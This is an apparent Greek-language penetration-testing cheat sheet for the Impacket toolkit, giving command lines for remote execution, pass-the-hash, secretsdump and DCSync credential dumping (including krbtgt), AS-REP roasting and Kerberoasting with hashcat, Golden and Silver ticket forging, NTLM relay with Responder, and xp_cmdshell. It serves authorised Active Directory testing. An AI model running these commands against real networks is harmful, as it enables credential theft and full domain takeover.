# 🐍 Impacket — Εργαλεία Python για πρωτόκολλα και ελέγχους AD

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇹🇷 Türkçe Sürüm](README.tr.md)

```
  ██╗███╗   ███╗██████╗  █████╗  ██████╗██╗  ██╗███████╗████████╗
  ██║████╗ ████║██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝
  ██║██╔████╔██║██████╔╝███████║██║     █████╔╝ █████╗     ██║   
  ██║██║╚██╔╝██║██╔═══╝ ██╔══██║██║     ██╔═██╗ ██╔══╝     ██║   
  ██║██║ ╚═╝ ██║██║     ██║  ██║╚██████╗██║  ██╗███████╗   ██║   
  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
              Εργαλεία Python για πρωτόκολλα δικτύου
```

<p align="center">
  <img src="https://img.shields.io/badge/Impacket-Active_Directory-red?style=for-the-badge" alt="Impacket">
  <img src="https://img.shields.io/badge/Python-blue?style=for-the-badge" alt="Python">
  <img src="https://img.shields.io/badge/Kerberos-green?style=for-the-badge" alt="Kerberos">
</p>

---

## Πριν ξεκινήσετε

Το **Impacket** είναι βιβλιοθήκη Python με εργαλεία παραδειγμάτων για πρωτόκολλα όπως SMB, RPC και Kerberos. Η επιτυχία σύνδεσης δεν δίνει αυτόματα δικαίωμα εκτέλεσης, ανάγνωσης μυστικών ή αναπαραγωγής καταλόγου· κάθε λειτουργία έχει χωριστές προϋποθέσεις.

**Βασικοί όροι:** *SMB* = πρωτόκολλο κοινόχρηστων πόρων, *RPC/WMI/DCOM* = μηχανισμοί επικοινωνίας και διαχείρισης Windows, *DCSync* = χρήση λειτουργιών αναπαραγωγής AD με κατάλληλα δικαιώματα, *ccache* = αρχείο προσωρινής αποθήκευσης tickets Kerberos, *NT hash* = αποτύπωμα κωδικού διαφορετικό από καταγραφή NetNTLMv2.

Οι ονομασίες τύπου impacket-psexec και psexec.py εξαρτώνται από τον τρόπο εγκατάστασης. Τα domains, οι κωδικοί και οι IP είναι ενδεικτικά. Ο οδηγός μεταφράζει τα υπάρχοντα παραδείγματα χωρίς να τα εκτελεί.

## 📋 Περιεχόμενα

- [🎯 Τι είναι το Impacket](#section-01)
- [🚀 Εγκατάσταση](#section-02)
- [💻 Απομακρυσμένη εκτέλεση](#section-03)
- [🔓 Εξαγωγή στοιχείων πρόσβασης](#section-04)
- [🎫 Παραδείγματα ελέγχων Kerberos](#section-05)
- [📁 Έλεγχοι SMB](#section-06)
- [🗄️ Έλεγχοι MSSQL](#section-07)
- [📂 Ερωτήματα LDAP και AD](#section-08)
- [📊 Γρήγορη αναφορά](#section-09)
- [📚 Πηγές](#section-10)

---

<a id="section-01"></a>

## 🎯 Τι είναι το Impacket

Το **Impacket** είναι συλλογή κλάσεων Python και παραδειγμάτων εργαλείων για πρωτόκολλα δικτύου. Χρησιμοποιείται σε ελέγχους AD για:

- 🎫 **Kerberos** — έλεγχοι AS-REP/Kerberoasting και tickets
- 💻 **Απομακρυσμένη εκτέλεση** — εργαλεία psexec, wmiexec, smbexec και atexec
- 🔓 **Εξαγωγή στοιχείων πρόσβασης** — secretsdump και λειτουργίες DCSync
- 📁 **SMB** — λειτουργίες αρχείων και έλεγχοι relay
- 🗄️ **MSSQL** — έλεγχοι βάσης δεδομένων

### Βασικά εργαλεία

| Εργαλείο | Περιγραφή |
|------|-------------|
| **psexec.py** | Απομακρυσμένη εκτέλεση μέσω SMB |
| **wmiexec.py** | Απομακρυσμένη εκτέλεση μέσω WMI |
| **secretsdump.py** | Εξαγωγή στοιχείων πρόσβασης ή αποτυπωμάτων |
| **GetNPUsers.py** | Έλεγχος AS-REP roasting |
| **GetUserSPNs.py** | Kerberoasting — έλεγχος αντοχής κωδικών υπηρεσιών |
| **ntlmrelayx.py** | Έλεγχοι προώθησης ταυτοποίησης NTLM |
| **smbclient.py** | Εφαρμογή πελάτη SMB |
| **mssqlclient.py** | Εφαρμογή πελάτη MSSQL |

---

<a id="section-02"></a>

## 🚀 Εγκατάσταση

> **Ονομασίες και έλεγχος έκδοσης:** Τα distro wrappers impacket-* και τα scripts *.py διαφέρουν ανά εγκατάσταση. Το attribute __version__ του αρχικού παραδείγματος δεν είναι εγγυημένο δημόσιο attribute κάθε έκδοσης. Επιβεβαιώστε την εγκατάσταση από το [επίσημο Impacket](https://github.com/fortra/impacket).


### Kali Linux

```bash
# Μπορεί να είναι προεγκατεστημένο στο αντίστοιχο περιβάλλον Kali
impacket-psexec --help

# Εναλλακτικό παράδειγμα εγκατάστασης ή ενημέρωσης
pip3 install impacket
pip3 install impacket --upgrade
```

### Εγκατάσταση από το GitHub

```bash
git clone https://github.com/fortra/impacket.git
cd impacket
pip3 install .

# Εναλλακτικά, εγκατάσταση για ανάπτυξη
pip3 install -e .
```

### Έλεγχος εγκατάστασης

```bash
# Έλεγχος εγκατάστασης
impacket-psexec --help
python3 -c "import impacket; print(impacket.__version__)"
```

---

<a id="section-03"></a>

## 💻 Απομακρυσμένη εκτέλεση

> **Δικαιώματα και καταγραφές:** Οι μέθοδοι SMB/WMI/DCOM/Task Scheduler απαιτούν αντίστοιχη πρόσβαση και μπορούν να δημιουργούν υπηρεσίες, εργασίες ή αρχεία. Η κατάταξη stealth του πίνακα είναι υποκειμενική, όχι εγγύηση. Το -target-ip ορίζει διεύθυνση σύνδεσης και δεν επιλέγει share.


### psexec.py

```bash
# Με κωδικό πρόσβασης
impacket-psexec domain.local/user:password@10.10.10.10

# Με αποτύπωμα NT για Pass-the-Hash
impacket-psexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Παράδειγμα τοπικού διαχειριστή
impacket-psexec administrator:password@10.10.10.10

# Εκτέλεση εντολής
impacket-psexec domain.local/user:password@10.10.10.10 "whoami"

# Το -target-ip ορίζει IP στόχου, όχι κοινόχρηστο φάκελο
impacket-psexec domain.local/user:password@10.10.10.10 -target-ip 10.10.10.10
```

### wmiexec.py

```bash
# Διαφορετικός μηχανισμός από psexec· δεν εγγυάται μικρότερη ανιχνευσιμότητα
impacket-wmiexec domain.local/user:password@10.10.10.10

# Με αποτύπωμα NT
impacket-wmiexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Εκτέλεση εντολής
impacket-wmiexec domain.local/user:password@10.10.10.10 "whoami"

# Χωρίς συλλογή εξόδου· δεν σημαίνει απουσία καταγραφών
impacket-wmiexec domain.local/user:password@10.10.10.10 -nooutput "cmd /c calc.exe"
```

### smbexec.py

```bash
# Χρήση μηχανισμών SMB για εκτέλεση
impacket-smbexec domain.local/user:password@10.10.10.10

# Με αποτύπωμα NT
impacket-smbexec domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Καθορισμός κοινόχρηστου φακέλου
impacket-smbexec domain.local/user:password@10.10.10.10 -share ADMIN$
```

### atexec.py

```bash
# Χρήση χρονοπρογραμματιστή εργασιών
impacket-atexec domain.local/user:password@10.10.10.10 "whoami"

# Με αποτύπωμα NT
impacket-atexec domain.local/user@10.10.10.10 -hashes :NTLMHASH "whoami"
```

### dcomexec.py

```bash
# Χρήση DCOM
impacket-dcomexec domain.local/user:password@10.10.10.10

# Διαφορετικά αντικείμενα DCOM
impacket-dcomexec domain.local/user:password@10.10.10.10 -object MMC20
impacket-dcomexec domain.local/user:password@10.10.10.10 -object ShellWindows
impacket-dcomexec domain.local/user:password@10.10.10.10 -object ShellBrowserWindow
```

---

<a id="section-04"></a>

## 🔓 Εξαγωγή στοιχείων πρόσβασης

### secretsdump.py

```bash
# Εξαγωγή στοιχείων από απομακρυσμένο σύστημα
impacket-secretsdump domain.local/user:password@10.10.10.10

# Εξαγωγή με ταυτοποίηση μέσω αποτυπώματος NT
impacket-secretsdump domain.local/user@10.10.10.10 -hashes :NTLMHASH

# Εξαγωγή από domain controller, ανά διαθέσιμα δικαιώματα και λειτουργία
impacket-secretsdump domain.local/admin:password@DC01.domain.local

# DCSync για συγκεκριμένο λογαριασμό
impacket-secretsdump -just-dc-user krbtgt domain.local/admin:password@DC01.domain.local

# Μόνο αποτυπώματα NT, χωρίς κλειδιά Kerberos
impacket-secretsdump -just-dc-ntlm domain.local/admin:password@DC01.domain.local

# Αποθήκευση σε αρχείο
impacket-secretsdump domain.local/admin:password@10.10.10.10 -outputfile hashes
```

### Σενάριο DCSync

> **Δεν είναι πλήρες αντίγραφο βάσης:** Η λειτουργία εξάγει υποστηριζόμενα στοιχεία λογαριασμών μέσω αναπαραγωγής, όχι κάθε αντικείμενο και δεδομένο της βάσης AD. Απαιτούνται κατάλληλα δικαιώματα αναπαραγωγής και δεν είναι υποχρεωτικά ταυτόσημα με απλή τοπική διαχείριση ή συμμετοχή σε συγκεκριμένη ομάδα.


```bash
# DCSync για υποστηριζόμενα στοιχεία πρόσβασης· δεν είναι πλήρες αντίγραφο βάσης AD
impacket-secretsdump -just-dc domain.local/admin:password@DC01.domain.local

# DCSync συγκεκριμένου χρήστη
impacket-secretsdump -just-dc-user Administrator domain.local/admin:password@DC01.domain.local

# DCSync του krbtgt, ως προϋπόθεση συγκεκριμένου σεναρίου Golden Ticket
impacket-secretsdump -just-dc-user krbtgt domain.local/admin:password@DC01.domain.local

# Output format: user:RID:LM:NTLM:::
```

### Από τοπικά αρχεία

```bash
# Από NTDS.dit και SYSTEM
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# Από SAM και SYSTEM
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Από SECURITY και SYSTEM για μυστικά LSA
impacket-secretsdump -security SECURITY -system SYSTEM LOCAL
```

---

<a id="section-05"></a>

## 🎫 Παραδείγματα ελέγχων Kerberos

> **Προϋποθέσεις Kerberos:** AS-REP χωρίς κωδικό αφορά λογαριασμούς χωρίς απαίτηση προταυτοποίησης. Kerberoasting, αίτημα TGT και χρήση ticket απαιτούν αντίστοιχες πληροφορίες και επιτρεπόμενους τύπους κρυπτογράφησης. DNS, ώρα, domain/realm και SPN επηρεάζουν το αποτέλεσμα. Τα modes cracking του δείγματος δεν εφαρμόζονται σε κάθε τύπο ticket.


### AS-REP Roasting με GetNPUsers.py

```bash
# Αναζήτηση χρηστών χωρίς απαίτηση προταυτοποίησης
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass

# Με διαπιστευτήρια
impacket-GetNPUsers domain.local/user:password -request

# Με ρητή IP domain controller
impacket-GetNPUsers domain.local/user:password -dc-ip 10.10.10.10 -request

# Αποθήκευση σε αρχείο
impacket-GetNPUsers domain.local/user:password -request -outputfile asrep.txt

# Μορφή εξόδου για Hashcat
impacket-GetNPUsers domain.local/user:password -request -format hashcat

# Μορφή εξόδου για John the Ripper
impacket-GetNPUsers domain.local/user:password -request -format john
```

### Kerberoasting με GetUserSPNs.py

```bash
# Αναζήτηση λογαριασμών με SPN για διερεύνηση Kerberoasting
impacket-GetUserSPNs domain.local/user:password

# Αίτημα tickets υπηρεσιών TGS
impacket-GetUserSPNs domain.local/user:password -request

# Αποθήκευση σε αρχείο
impacket-GetUserSPNs domain.local/user:password -request -outputfile kerberoast.txt

# IP domain controller
impacket-GetUserSPNs domain.local/user:password -dc-ip 10.10.10.10 -request

# Με αποτύπωμα NT
impacket-GetUserSPNs domain.local/user -hashes :NTLMHASH -request
```

### Έλεγχος υποψήφιων κωδικών σε δεδομένα Kerberos

```bash
# AS-REP του συγκεκριμένου τύπου, με λειτουργία Hashcat 18200
hashcat -m 18200 asrep.txt wordlist.txt

# Kerberoast RC4 του συγκεκριμένου τύπου, με λειτουργία Hashcat 13100
hashcat -m 13100 kerberoast.txt wordlist.txt

# Με John the Ripper
john --wordlist=wordlist.txt asrep.txt
john --wordlist=wordlist.txt kerberoast.txt
```

### getTGT.py

```bash
# Αίτημα TGT με κωδικό πρόσβασης
impacket-getTGT domain.local/user:password

# Αίτημα TGT με διαθέσιμο κλειδί RC4/NT
impacket-getTGT domain.local/user -hashes :NTLMHASH

# Αίτημα TGT με διαθέσιμο κλειδί AES
impacket-getTGT domain.local/user -aesKey <AES256KEY>

# Αποθήκευση σε user.ccache, σύμφωνα με το παράδειγμα
# Ορισμός μεταβλητής περιβάλλοντος για χρήση:
export KRB5CCNAME=user.ccache
```

### ticketer.py — Golden και Silver Tickets

> **Διαφορετικές υπηρεσίες:** Το Silver Ticket του παραδείγματος αφορά SPN MSSQLSvc, ενώ το επόμενο psexec χρειάζεται κατάλληλη πρόσβαση σε SMB/CIFS. Η ίδια ακολουθία δεν αποτελεί αυτόματα λειτουργικό σενάριο. Ticket, λογαριασμός, υπηρεσία και κλειδί πρέπει να συμφωνούν.


```bash
# Golden Ticket
impacket-ticketer -nthash <KRBTGT_NTLM_HASH> -domain-sid S-1-5-21-... -domain domain.local Administrator

# Silver Ticket
impacket-ticketer -nthash <SERVICE_NTLM_HASH> -domain-sid S-1-5-21-... -domain domain.local -spn MSSQLSvc/target.domain.local:1433 Administrator

# Χρήση του ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec domain.local/Administrator@target.domain.local -k -no-pass
```

---

<a id="section-06"></a>

## 📁 Έλεγχοι SMB

> **Εγγραφή αρχείου και εκτέλεση διαφέρουν:** Η εγγραφή σε share δεν δίνει αυτόματα δικαίωμα εκτέλεσης εντολής. Επιλογές ntlmrelayx όπως --sam και δυνατότητες endpoint χρειάζονται έλεγχο στη συγκεκριμένη έκδοση. Το relay απαιτεί πραγματική ανταλλαγή ταυτοποίησης και συμβατές προστασίες.


### smbclient.py

```bash
# Σύνδεση σε υπηρεσία SMB
impacket-smbclient domain.local/user:password@10.10.10.10

# Καταγραφή κοινόχρηστων φακέλων
# Μέσα στο περιβάλλον του smbclient
shares

# Επιλογή συγκεκριμένου κοινόχρηστου φακέλου
use SHARE_NAME

# Καταγραφή αρχείων
ls

# Λήψη αρχείου
get filename

# Μεταφόρτωση αρχείου
put localfile

# Εκτέλεση εντολής
# Η δυνατότητα εγγραφής σε share δεν δίνει από μόνη της απομακρυσμένη εκτέλεση
```

### smbserver.py

```bash
# Εκκίνηση SMB server για μεταφορά αρχείων του ελεγχόμενου σεναρίου
impacket-smbserver share /tmp/share

# Με ταυτοποίηση
impacket-smbserver share /tmp/share -username user -password pass

# Υποστήριξη SMB2
impacket-smbserver share /tmp/share -smb2support
```

### ntlmrelayx.py

```bash
# Βασικό παράδειγμα relay
impacket-ntlmrelayx -tf targets.txt

# Προώθηση ταυτοποίησης σε SMB
impacket-ntlmrelayx -tf targets.txt -smb2support

# Προώθηση ταυτοποίησης και εκτέλεση εντολής, όπου επιτρέπεται
impacket-ntlmrelayx -tf targets.txt -c "whoami"

# Παράδειγμα εξαγωγής SAM μέσω relay· ελέγξτε συμβατότητα επιλογών
impacket-ntlmrelayx -tf targets.txt -smb2support --sam

# Προώθηση ταυτοποίησης σε LDAP
impacket-ntlmrelayx -t ldap://DC01.domain.local

# Σε συνδυασμό με Responder:
# 1. Ρύθμιση Responder.conf: SMB = Off, HTTP = Off
# 2. Εκτέλεση: responder -I eth0
# 3. Εκτέλεση: impacket-ntlmrelayx -tf targets.txt -smb2support
```

---

<a id="section-07"></a>

## 🗄️ Έλεγχοι MSSQL

### mssqlclient.py

```bash
# Σύνδεση με ταυτοποίηση Windows
impacket-mssqlclient domain.local/user:password@10.10.10.10 -windows-auth

# Σύνδεση με ταυτοποίηση SQL Server
impacket-mssqlclient sa:password@10.10.10.10

# Με αποτύπωμα NT
impacket-mssqlclient domain.local/user@10.10.10.10 -hashes :NTLMHASH -windows-auth

# Σύνδεση με επιλεγμένη βάση δεδομένων
impacket-mssqlclient domain.local/user:password@10.10.10.10 -windows-auth -db master
```

### Εντολές MSSQL

```sql
-- Ενεργοποίηση xp_cmdshell, εφόσον επιτρέπεται
enable_xp_cmdshell

-- Εκτέλεση εντολής
xp_cmdshell whoami

-- Ερώτημα SQL
SELECT * FROM master.sys.databases

-- Ανάγνωση αρχείου
SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents
```

---

<a id="section-08"></a>

## 📂 Ερωτήματα LDAP και AD

### GetADUsers.py

```bash
# Κατάλογος χρηστών
impacket-GetADUsers domain.local/user:password -all

# Συγκεκριμένος domain controller
impacket-GetADUsers domain.local/user:password -dc-ip 10.10.10.10 -all

# Με αποτύπωμα NT
impacket-GetADUsers domain.local/user -hashes :NTLMHASH -all
```

### lookupsid.py

```bash
# Αναζήτηση λογαριασμών με δοκιμές αναγνωριστικών SID/RID
impacket-lookupsid domain.local/user:password@10.10.10.10

# Καθορισμός ορίου αναγνωριστικών για δοκιμή
impacket-lookupsid domain.local/user:password@10.10.10.10 20000
```

### findDelegation.py

```bash
# Αναζήτηση ρυθμίσεων ανάθεσης
impacket-findDelegation domain.local/user:password -dc-ip 10.10.10.10
```

---

<a id="section-09"></a>

## 📊 Γρήγορη αναφορά

### Επιλογές ταυτοποίησης

| Επιλογή | Περιγραφή |
|--------|-------------|
| `user:password` | Ταυτοποίηση με κωδικό πρόσβασης |
| `-hashes :NTLM` | Αποτύπωμα NT για Pass-the-Hash |
| `-hashes LM:NTLM` | Ζεύγος αποτυπωμάτων LM και NT |
| `-aesKey KEY` | Κλειδί AES 128 ή 256 bits |
| `-k -no-pass` | Ταυτοποίηση Kerberos με κατάλληλο αρχείο ccache |

### Συνηθισμένες επιλογές

| Επιλογή | Περιγραφή |
|--------|-------------|
| `-dc-ip IP` | IP του domain controller |
| `-target-ip IP` | IP στόχου |
| `-debug` | Ενεργοποίηση διαγνωστικών μηνυμάτων |

### Σύνοψη μεθόδων απομακρυσμένης εκτέλεσης

| Εργαλείο | Μέθοδος | Ενδεικτική αξιολόγηση αφάνειας του πρωτοτύπου |
|------|--------|---------|
| psexec.py | SMB και δημιουργία υπηρεσίας | Χαμηλή |
| wmiexec.py | WMI | Μέση |
| smbexec.py | SMB | Χαμηλή |
| atexec.py | Χρονοπρογραμματιστής εργασιών | Υψηλή |
| dcomexec.py | DCOM | Μέση |

### Ροή εργασίας ελέγχου

```bash
# 1. Αναζήτηση χρηστών για έλεγχο AS-REP
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass

# 2. Έλεγχος Kerberoasting
impacket-GetUserSPNs domain.local/user:password -request

# 3. Έλεγχος υποψήφιων κωδικών
hashcat -m 18200 asrep.txt rockyou.txt
hashcat -m 13100 kerberoast.txt rockyou.txt

# 4. Χρήση διαθέσιμου κωδικού ή κατάλληλου αποτυπώματος NT
impacket-psexec domain.local/admin:password@10.10.10.10

# 5. Εξαγωγή επιτρεπόμενων στοιχείων πρόσβασης
impacket-secretsdump domain.local/admin:password@DC01

# 6. DCSync στο εγκεκριμένο εύρος λογαριασμών
impacket-secretsdump -just-dc domain.local/admin:password@DC01
```

---

<a id="section-10"></a>

## 📚 Πηγές

- [Κώδικας Impacket στο GitHub](https://github.com/fortra/impacket)
- [Παραδείγματα Impacket](https://github.com/fortra/impacket/tree/master/examples)
- [Wiki του έργου](https://github.com/fortra/impacket/wiki)

### Σχετικοί οδηγοί
- [BloodHound](../../BloodHound/translations/README.el.md)
- [Mimikatz](../../Mimikatz/translations/README.el.md)
- [Hashcat](../../Hashcat/translations/README.el.md)

---

<p align="center">
  <b>🐍 Εξασκηθείτε στους ελέγχους πρωτοκόλλων με Python!</b><br>
  <i>Impacket — αλληλεπίδραση με δικτυακά πρωτόκολλα</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
